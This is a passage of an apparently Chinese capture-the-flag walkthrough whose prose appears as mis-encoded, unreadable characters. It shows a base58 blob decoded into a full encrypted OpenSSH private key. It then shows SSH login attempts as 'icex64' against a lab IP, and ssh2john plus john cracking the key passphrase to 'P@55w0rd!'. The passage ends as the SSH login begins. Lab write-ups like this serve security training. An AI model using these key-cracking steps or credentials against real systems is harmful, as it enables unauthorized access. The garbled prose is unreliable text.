class="hljs-number">3</span>Aygg<span class="hljs-symbol">nywjjwZ8</span>uoWQbmx<span class="hljs-number">8</span>Sx<span class="hljs-number">71</span>x<span class="hljs-number">4</span><span class="hljs-symbol">NyhHZUzHpi8</span>vkEkbKKk<span class="hljs-number">1</span>rVL<span class="hljs-symbol">NBWHHi75</span>HixzAt<span class="hljs-symbol">NTX6</span>p<span class="hljs-symbol">nEJC3</span>t<span class="hljs-number">7</span>EPkbouDC<span class="hljs-number">2</span>eQd<span class="hljs-number">9</span>i<span class="hljs-number">6</span>K<span class="hljs-number">3</span>C<span class="hljs-symbol">npZHY3</span>mL<span class="hljs-number">7</span>zc<span class="hljs-name">g2</span>PHesRSj<span class="hljs-number">6</span>e<span class="hljs-number">7</span>oZBo<span class="hljs-name">M2</span>pSVTwtXRFBPTyFmUavtitoA<span class="hljs-number">8</span>kFZb<span class="hljs-number">4</span>DhYMcx<span class="hljs-symbol">NyLf7</span>r<span class="hljs-number">8</span>H<span class="hljs-number">98</span>WbtCshaEBaY<span class="hljs-number">7</span>b<span class="hljs-number">5</span>C<span class="hljs-symbol">ntvgFFEucFanfbz6</span>w<span class="hljs-number">8</span>cDyXJ<span class="hljs-symbol">nkzeW1</span>fz<span class="hljs-number">19</span><span class="hljs-symbol">Ni9</span>i<span class="hljs-number">6</span>h<span class="hljs-number">4</span>Bg<span class="hljs-meta">o6</span>BR<span class="hljs-number">8</span>Fkd<span class="hljs-number">5</span>dheH<span class="hljs-number">5</span>TGz<span class="hljs-number">47</span>VFH<span class="hljs-number">6</span>hmY<span class="hljs-number">3</span>aUgUvP<span class="hljs-number">8</span>Ai<span class="hljs-number">2</span>F<span class="hljs-number">2</span>jKFK<span class="hljs-name">g4</span>i<span class="hljs-number">3</span>HfCJHG<span class="hljs-name">g1</span>CXktuqz<span class="hljs-symbol">nVucjWmdZmuACA2</span>gce<span class="hljs-number">2</span>rpiBT<span class="hljs-number">6</span>GxmMrfSxDCiY<span class="hljs-number">32</span>axw<span class="hljs-number">2</span>QP<span class="hljs-number">7</span><span class="hljs-symbol">nzEBvCJi58</span>rVe<span class="hljs-number">8</span>JtdESt<span class="hljs-number">2</span>zHGsUga<span class="hljs-number">2</span>iySmusfpWqjY<span class="hljs-name">m8</span>kfmqTbY<span class="hljs-number">4</span>qAK<span class="hljs-number">13</span>v<span class="hljs-symbol">NMR95</span>QhXV<span class="hljs-number">9</span>VYp<span class="hljs-number">9</span>qff<span class="hljs-name">G5</span>YWY<span class="hljs-number">163</span>WJV<span class="hljs-number">5</span>urYK<span class="hljs-name">M6</span>BBiuK<span class="hljs-number">9</span>QkswCzgPtjsfFBBU<span class="hljs-meta">o6</span>vft<span class="hljs-symbol">NqCNbzQn4</span><span class="hljs-symbol">NMQmxm28</span>hDMDU<span class="hljs-number">8</span>GydwU<span class="hljs-name">m19</span>oj<span class="hljs-symbol">No1</span>scUMzGf<span class="hljs-symbol">N4</span>rLx<span class="hljs-number">7</span>bs<span class="hljs-number">3</span>S<span class="hljs-number">9</span>wYaVLDLi<span class="hljs-symbol">NeZdLLU1</span>DaKQhZ<span class="hljs-number">5</span>cFZ<span class="hljs-number">7</span>iymJHXuZFFgpbYZYFigLa<span class="hljs-number">7</span>SokXis<span class="hljs-number">1</span>LYfbHeXM<span class="hljs-attr">vcfeuApmAaGQk6</span>xmajEbpcb<span class="hljs-symbol">n1</span>H<span class="hljs-number">5</span>QQiQpYMX<span class="hljs-number">3</span>BRp<span class="hljs-number">41</span>w<span class="hljs-number">9</span>RVRuLGZ<span class="hljs-number">1</span>yLKxP<span class="hljs-number">37</span>ogcppStCvDMGfiuVMU<span class="hljs-number">5</span>SRJMajLXJBz<span class="hljs-symbol">nzRSqBYwWmf4</span>MS<span class="hljs-number">6</span>B<span class="hljs-number">57</span>xp<span class="hljs-number">56</span>jVk<span class="hljs-number">6</span>maGCsgjbuAhLyCwfG<span class="hljs-symbol">n1</span>LwLoJDQ<span class="hljs-number">1</span>kjLm<span class="hljs-symbol">nVrk7</span>FkUUESqJKjp<span class="hljs-number">5</span>cuX<span class="hljs-number">1</span>EUpFjsfU<span class="hljs-number">1</span>HaibABz<span class="hljs-number">3</span>fcYY<span class="hljs-number">2</span>cZ<span class="hljs-number">78</span>qx<span class="hljs-number">2</span>iaqS<span class="hljs-number">7</span>eP<span class="hljs-meta">o5</span>Bkwv<span class="hljs-number">5</span>XmtcLELXbQZKcHcwxkbC<span class="hljs-number">5</span>P<span class="hljs-symbol">nEP6</span>EUZRb<span class="hljs-number">3</span><span class="hljs-symbol">nqm5</span>hMDUUt<span class="hljs-number">912</span>ha<span class="hljs-number">5</span>kMR<span class="hljs-number">6</span><span class="hljs-name">g4</span>aV<span class="hljs-name">G8</span>bXFU<span class="hljs-number">6</span>a<span class="hljs-symbol">n5</span>PikaedHBRVRCygkpQj<span class="hljs-name">m8</span>Lhe<span class="hljs-number">1</span>cA<span class="hljs-number">8</span>X<span class="hljs-number">2</span>jtQiUjwveF<span class="hljs-number">5</span>bU<span class="hljs-symbol">NPmvPGk1</span>hjuP<span class="hljs-number">56</span>aWEg<span class="hljs-symbol">nyXzZkKVPbWj7</span>MQQ<span class="hljs-number">3</span>kAfqZ<span class="hljs-number">8</span>hkKD<span class="hljs-number">1</span>VgQ<span class="hljs-number">8</span>pmqayiajhFHorfgtRk<span class="hljs-number">8</span>ZpuEPpHH<span class="hljs-number">25</span>aoJf<span class="hljs-symbol">NMtY45</span>mJYjHM<span class="hljs-attr">VSVnvG9</span>e<span class="hljs-number">3</span>PHrGwrks<span class="hljs-number">1</span>eLQRXjjRmGtWu<span class="hljs-number">9</span>cwT<span class="hljs-number">2</span>bjy<span class="hljs-number">2</span>huWY<span class="hljs-number">5</span>b<span class="hljs-number">7</span>xUSAXZfmRsbkT<span class="hljs-number">3</span>eFQ<span class="hljs-symbol">nGkAHmjMZ5</span><span class="hljs-symbol">nAfmeGhshCtNjAU4</span>idu<span class="hljs-number">8</span><span class="hljs-meta">o7</span>HMmMuc<span class="hljs-number">3</span>tpK<span class="hljs-number">6</span>res<span class="hljs-number">9</span>HTC<span class="hljs-meta">o35</span>ujK<span class="hljs-number">3</span>UK<span class="hljs-number">2</span>LyMFEKjB<span class="hljs-symbol">NcXbigDWSM34</span>mXSKHA<span class="hljs-number">1</span><span class="hljs-name">M4</span>MF<span class="hljs-number">7</span>dPewvQsAkvxRTCmeWwRWz<span class="hljs-number">6</span>DKZv<span class="hljs-number">2</span>MY<span class="hljs-number">1</span>ezWd<span class="hljs-number">7</span>mLvwG<span class="hljs-meta">o9</span>ti<span class="hljs-number">9</span>SMTXrkrxHQ<span class="hljs-number">8</span>DShu<span class="hljs-symbol">NorjCzNCuxLNG9</span>ThpPgWJoFb<span class="hljs-number">1</span>sJL<span class="hljs-number">1</span>ic<span class="hljs-number">9</span>QVTvDHCJ<span class="hljs-symbol">nD1</span>AKdCjt<span class="hljs-symbol">NHrG973</span>BVZ<span class="hljs-symbol">NUF6</span>DwbFq<span class="hljs-number">5</span>d<span class="hljs-number">4</span>CTL<span class="hljs-symbol">N6</span>jxtCFs<span class="hljs-number">3</span>XmoKquzEY<span class="hljs-number">7</span>MiCzRaq<span class="hljs-number">3</span>kB<span class="hljs-symbol">NAFYNCoVxRBU3</span>d<span class="hljs-number">3</span>aXfLX<span class="hljs-number">4</span>rZXEDBfAgtumkRRmWowk<span class="hljs-symbol">Njs2</span>JDZmzS<span class="hljs-number">4</span>H<span class="hljs-number">8</span><span class="hljs-symbol">nawmMa1</span>PYmrr<span class="hljs-number">7</span>a<span class="hljs-symbol">NDPEW2</span>wdbjZurKAZhheoEYCvP<span class="hljs-number">9</span>dfqdbL<span class="hljs-number">9</span>gPrWf<span class="hljs-symbol">NBJyVBXRD8</span>EZwFZ<span class="hljs-symbol">NKb1</span>eWPh<span class="hljs-number">1</span>sYzUbPPhgruxWA<span class="hljs-symbol">NCH52</span>gQpfAT<span class="hljs-symbol">NqmtTJZFjsfpiXLQjdBxdzfz7</span>pWvK<span class="hljs-number">8</span>jivh<span class="hljs-symbol">nQaiajW3</span>pwt<span class="hljs-number">4</span>cZxwMfcrrJke<span class="hljs-number">14</span>v<span class="hljs-symbol">N8</span>Xbyqdr<span class="hljs-number">9</span>zLFjZDJ<span class="hljs-number">7</span><span class="hljs-symbol">nLdmuXTwxPwD8</span>Seoq<span class="hljs-number">2</span>hYEhR<span class="hljs-number">97</span>D<span class="hljs-symbol">nKfMY2</span>LhoWGaHoFqycPCaX<span class="hljs-number">5</span>FCP<span class="hljs-symbol">Nf9</span>CFt<span class="hljs-number">4</span><span class="hljs-symbol">n4</span><span class="hljs-symbol">nYGLau7</span>ci<span class="hljs-number">5</span>uC<span class="hljs-number">7</span>ZmssiT<span class="hljs-number">1</span>jHTjKy<span class="hljs-number">7</span>J<span class="hljs-number">9</span>a<span class="hljs-number">4</span>q<span class="hljs-number">614</span>GFDdZULTkw<span class="hljs-number">8</span>Pmh<span class="hljs-number">92</span>fuTdK<span class="hljs-number">7</span>Z<span class="hljs-number">6</span>fweY<span class="hljs-number">4</span>hZyGdUXGtPXveXwGWES<span class="hljs-number">36</span>ecCpYXPSPw<span class="hljs-number">6</span>ptVb<span class="hljs-number">9</span>RxC<span class="hljs-number">81</span>AZFPG<span class="hljs-symbol">nts85</span>PYS<span class="hljs-number">6</span>aD<span class="hljs-number">2</span>eUmge<span class="hljs-number">6</span>KGzFopMjYLma<span class="hljs-number">85</span>X<span class="hljs-number">55</span>Pu<span class="hljs-number">4</span>tCxyF<span class="hljs-number">2</span>FR<span class="hljs-number">9</span>E<span class="hljs-number">3</span>c<span class="hljs-number">2</span>zxtry<span class="hljs-name">G6</span><span class="hljs-symbol">N2</span>oVT<span class="hljs-symbol">nyZt23</span>YrEhEe<span class="hljs-number">9</span>kcCX<span class="hljs-number">59</span>RdhrDr<span class="hljs-number">71</span>Z<span class="hljs-number">3</span>zgQkAs<span class="hljs-number">8</span>uPM<span class="hljs-name">M1</span>JPvM<span class="hljs-symbol">NgdyNzpgEGGgj9</span>czgBa<span class="hljs-symbol">N5</span>PWrpPBWft<span class="hljs-name">g9</span>fte<span class="hljs-number">4</span>xYyvJ<span class="hljs-number">1</span>BF<span class="hljs-symbol">N5</span>WDvTYfhUtc<span class="hljs-symbol">n1</span>oRTDow<span class="hljs-number">67</span>w<span class="hljs-number">5</span>zz<span class="hljs-number">3</span>adjLD<span class="hljs-symbol">nXLQc6</span>MaowZJ<span class="hljs-number">2</span>zyh<span class="hljs-number">4</span>PAc<span class="hljs-number">1</span>vpstCRtKQt<span class="hljs-number">35</span>JEdwfwUe<span class="hljs-number">4</span>wz<span class="hljs-symbol">Nr3</span>sidChW<span class="hljs-number">8</span>VuMU<span class="hljs-number">1</span>Lz<span class="hljs-number">1</span>cAj<span class="hljs-attr">vcVHEp1</span>Sab<span class="hljs-meta">o8</span>FprJwJgRs<span class="hljs-number">5</span>ZPA<span class="hljs-number">7</span>Ve<span class="hljs-number">6</span>LDW<span class="hljs-number">7</span>hFa<span class="hljs-symbol">ngK8</span>YwZmRCmXxArBFVwjfV<span class="hljs-number">2</span>SjyhTjhdqswJE<span class="hljs-number">5</span><span class="hljs-symbol">nP6</span>pV<span class="hljs-symbol">nshbV8</span>Zq<span class="hljs-name">G2</span>L<span class="hljs-number">8</span>d<span class="hljs-number">1</span>cwhxpxggmu<span class="hljs-number">1</span>jByELxVHF<span class="hljs-number">1</span>C<span class="hljs-number">9</span>T<span class="hljs-number">3</span>GgLDvgUv<span class="hljs-number">8</span><span class="hljs-symbol">nc7</span>PEJYoXpCoyCs<span class="hljs-number">55</span>r<span class="hljs-number">35</span>h<span class="hljs-number">9</span>YzfKgjcJkvFTdfPHwW<span class="hljs-number">8</span>fSjCVBuUTKSEAvkRr<span class="hljs-number">6</span>iLj<span class="hljs-number">6</span>H<span class="hljs-number">4</span>LEjB<span class="hljs-name">g256</span><span class="hljs-name">G4</span>DHHqpwTgYFtejc<span class="hljs-number">8</span><span class="hljs-symbol">nLX77</span>LUoVmACLvfC<span class="hljs-number">439</span>jtVdxCtYA<span class="hljs-number">6</span>y<span class="hljs-number">2</span>vj<span class="hljs-number">7</span>ZDeX<span class="hljs-number">7</span>zp<span class="hljs-number">2</span>VYR<span class="hljs-number">89</span>GmSqEWj<span class="hljs-number">3</span>doqdahv<span class="hljs-number">1</span>DktvtQcRBiizMg<span class="hljs-symbol">NWYsjMWRM4</span>BPSc<span class="hljs-symbol">nn92</span><span class="hljs-symbol">ncLD1</span>Bw<span class="hljs-number">5</span>ioB<span class="hljs-number">8</span><span class="hljs-symbol">NyZ9</span>C<span class="hljs-symbol">NkMNk4</span>Pf<span class="hljs-number">7</span>Uqa<span class="hljs-number">7</span><span class="hljs-attr">vCTgw4</span>VJv<span class="hljs-attr">vSjE6</span>PRF<span class="hljs-symbol">nqDSrg4</span>avGUqeMUm<span class="hljs-symbol">ngc5</span>m<span class="hljs-symbol">N6</span>WEa<span class="hljs-number">3</span>pxHpkh<span class="hljs-name">G8</span>Z<span class="hljs-symbol">ngCqKvVhegBAVi7</span><span class="hljs-symbol">nDBTwukqEDeCS46</span>UczhXMFbAg<span class="hljs-symbol">nQWhExas547</span><span class="hljs-attr">vCXho71</span>gcmVqu<span class="hljs-number">2</span>x<span class="hljs-number">5</span>EAPFgJqyvMmRScQxiKrYoK<span class="hljs-number">3</span>p<span class="hljs-number">279</span>KLAyS<span class="hljs-name">M4</span>v<span class="hljs-symbol">NcRxrRrR2</span>DYQwhe<span class="hljs-number">8</span>Yj<span class="hljs-symbol">Nsf8</span>MzqjX<span class="hljs-number">54</span>mhbWcjz<span class="hljs-number">3</span>jeXoko<span class="hljs-symbol">nVk77</span>P<span class="hljs-number">9</span><span class="hljs-name">g9</span>y<span class="hljs-number">69</span>DVzJeYUvfX<span class="hljs-attr">VCjPWi7</span>aDDA<span class="hljs-number">7</span>HdQd<span class="hljs-number">2</span>UpCghEGtWSfEJtDgPxurPq<span class="hljs-number">8</span>qJQh<span class="hljs-number">3</span><span class="hljs-symbol">N75</span>YF<span class="hljs-number">8</span>KeQzJs<span class="hljs-number">77</span>Tpwcdv<span class="hljs-number">2</span>Wuvi<span class="hljs-number">1</span>L<span class="hljs-number">5</span>ZZtppbWymsgZckW<span class="hljs-symbol">nkg5</span><span class="hljs-symbol">NB9</span>Pp<span class="hljs-number">5</span>izVXCiFhobqF<span class="hljs-number">2</span>vd<span class="hljs-number">2</span>jh<span class="hljs-name">g4</span>rcpLZ<span class="hljs-symbol">nGdmmEotL7</span>CfRdVwUWpVppHRZzq<span class="hljs-number">7</span>FEQQFxkRL<span class="hljs-number">7</span>JzGoL<span class="hljs-number">8</span>R<span class="hljs-number">8</span>wQ<span class="hljs-name">G1</span>UyB<span class="hljs-symbol">NKPBbVnc7</span>jGyJqFuj<span class="hljs-attr">vCLt6</span>yMUEYXKQTipmEhx<span class="hljs-number">4</span>rXJZK<span class="hljs-number">3</span>aKdbucKhGqMYMH<span class="hljs-symbol">nVbtpLrQUaPZHsiNGUcEd64</span>KW<span class="hljs-number">5</span>kZ<span class="hljs-number">7</span>svohTC<span class="hljs-number">5</span>i<span class="hljs-number">4</span>L<span class="hljs-number">4</span>TuEzRZEyWy<span class="hljs-number">6</span>v<span class="hljs-number">2</span>GGiEp<span class="hljs-number">4</span>Mf<span class="hljs-number">2</span>oEHMUwqto<span class="hljs-symbol">NXbsGp8</span>sbJbZATFLXVbP<span class="hljs-number">3</span>PgBw<span class="hljs-number">8</span>rgAakz<span class="hljs-number">7</span>QBFAGryQ<span class="hljs-number">3</span>t<span class="hljs-symbol">nxytWNuHWkPohMMKUiDFeRyLi8</span>HGUdocwZFzdkbffv<span class="hljs-meta">o8</span>HaewPYF<span class="hljs-symbol">NsPDCn1</span>PwgS<span class="hljs-number">8</span>wA<span class="hljs-number">9</span>agCX<span class="hljs-number">5</span>kZbKWBmU<span class="hljs-number">2</span>zpCstqFAxXeQd<span class="hljs-number">8</span>LiwZzPdsbF<span class="hljs-number">2</span>YZEKz<span class="hljs-symbol">NYtckW5</span>RrFa<span class="hljs-number">5</span>zDgK<span class="hljs-name">m2</span>gSR<span class="hljs-symbol">N8</span>gHz<span class="hljs-number">3</span>WqS<br></code></pre></td></tr></table></figure><p>base64 è§£å¯†åæ˜¯ä¹±ç ï¼Œbase çš„éƒ½è¯•äº†ä¸‹ï¼Œæœ€ç»ˆç¡®å®šæ˜¯ base58 åŠ å¯†ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs awk">-----<span class="hljs-keyword">BEGIN</span> OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp<br>PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk<br><span class="hljs-number">9</span>GXiytplgT9z<span class="hljs-regexp">/mP91NqOU9QoAwop5JNxhEfm/</span>j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9<br>H6NSb0jMbMc4soFrBinoLEkx894B<span class="hljs-regexp">/PqUTODesMEV/</span>aK22UKegdwlJ9Arf+<span class="hljs-number">1</span>Y48V86gkzS6<br>xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7<br>J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0<span class="hljs-regexp">/nRfCaOrIzPfZ/</span>NNYgu<br>/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0<br>ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I<br>he0cLdyv316bFI8O+<span class="hljs-number">3</span>y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf<br>XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA<br>hzXJi4LGZ6mjaGEil+<span class="hljs-number">9</span>g4U7pjtEAqYv1+<span class="hljs-number">3</span>x8F+zuiZsVdMr/<span class="hljs-number">66</span>Ma4e6iwPLqmtzt3UiFGb<br><span class="hljs-number">4</span>Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq<br>mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp<br>MkMcBnzD9uynCjhZ9ijaPY<span class="hljs-regexp">/vMY7mtHZNCY8SeoWAxYXToKy2cu/</span>+pVyGQ76KYt3J0AT7wA<br><span class="hljs-number">2</span>OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG<span class="hljs-regexp">/b7z6zGvVxZca/g</span>572CXxXSXlb<br>QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+<span class="hljs-number">34</span>tK+kUoEaVAbwU+IchYyM8ZarSvHVpE<br>vFUPiANSHCZ<span class="hljs-regexp">/b+pdKQtBzTk5/</span>VH<span class="hljs-regexp">/Jk3QPcH69EJyx8/g</span>RE/glQY6z6nC6uoG4AkIl+gOxZ<br><span class="hljs-number">0</span>hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft<br>rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB<br>QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy<br>x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG<br>nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5<br>VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO<br>cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh<br>nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm<br><span class="hljs-number">8</span>UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+<span class="hljs-number">4</span>/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH<br>zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw<br>n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl<br>AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>oVb4p<span class="hljs-regexp">/rHHqqPNMNwM1ns+adF7REjzFwr4/</span>trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI<br><span class="hljs-number">63</span>RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>t<span class="hljs-regexp">/YYhQ/</span>r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+<span class="hljs-number">7</span>dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br><span class="hljs-number">8</span>nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+<span class="hljs-number">4</span>Qa4+oVk9ZluLBxeu22r<br>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x<span class="hljs-regexp">/IUt/</span>FP8Nq964pD7m/dPHQ<br>E8<span class="hljs-regexp">/oh4V1NTGWrDsK3AbLk/</span>MrgROSg7Ic4BS/<span class="hljs-number">8</span>IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+<span class="hljs-number">31</span>qP80O/+Kk9NUWalsz+<span class="hljs-number">6</span>Kt2<br>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/<span class="hljs-number">9</span>rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br><span class="hljs-number">5</span>KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ<br>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/<span class="hljs-number">4</span>m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br><span class="hljs-number">1</span>bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/<span class="hljs-number">4</span>ORlsC<br>iUJ66WmRUN9EoVlkeCzQJwivI=<br>-----<span class="hljs-keyword">END</span> OPENSSH PRIVATE KEY-----<br><br></code></pre></td></tr></table></figure><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>è™½ç„¶æç¤ºæ˜¯ç ´è§£ç§é’¥ï¼Œä½†å…ˆè¯•ä¸€ä¸‹èƒ½ä¸èƒ½ä½¿ç”¨ç§é’¥ç›´æ¥ç™»å½•ï¼š</p><blockquote><p>ç§é’¥æ–‡ä»¶æƒé™åº”è¯¥ä¸º 600ï¼Œä¸”ç§é’¥æ–‡ä»¶æœ€åè¦æœ‰å›è½¦</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l rsa</span><br>-rw-r--r-- 1 kali kali 3433 Jul  2 06:00 rsa<br>                                                                                                             $ ssh icex64@192.168.135.152 -i rsa<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>Permissions 0777 for &#x27;rsa&#x27; are too open.<br>It is required that your private key files are NOT accessible by others.<br>This private key will be ignored.<br>Load key &quot;rsa&quot;: bad permissions<br>icex64@192.168.135.152&#x27;s password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> chmod 600 rsa</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls -l rsa</span>                        <br>-rw------- 1 kali kali 3433 Jul  2 06:00 rsa<br>                                                                                                             $ ssh icex64@192.168.135.152 -i rsa<br>Load key &quot;rsa&quot;: invalid format<br>icex64@192.168.135.152&#x27;s password: <br>Permission denied, please try again.<br>icex64@192.168.135.152&#x27;s password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh icex64@192.168.135.152 -i rsa</span>                                                                         <br>Enter passphrase for key &#x27;rsa&#x27;: <br></code></pre></td></tr></table></figure><p>éœ€è¦ç§é’¥çš„å¯†ç ï¼Œä½¿ç”¨ ssh2john è½¬æ¢æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ john çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç  <code>P@55w0rd!</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> /usr/share/john/ssh2john.py rsa &gt; passwd.txt; john passwd.txt --wordlist=/usr/share/wordlists/fasttrack.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes<br>Cost 2 (iteration count) is 16 for all loaded hashes<br>Will run 4 OpenMP threads<br>Note: This format may emit false positives, so it will keep trying even after<br>finding a possible candidate.<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>P@55w0rd!        (rsa)<br>P@55w0rd!        (rsa)<br>P@55w0rd!        (rsa)<br>3g 0:00:00:06 DONE (2022-07-02 06:09) 0.4360g/s 32.26p/s 32.26c/s 32.26C/s 2003..starwars<br>Session completed<br></code></pre></td></tr></table></figure><p>ç™»å½• SSHï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 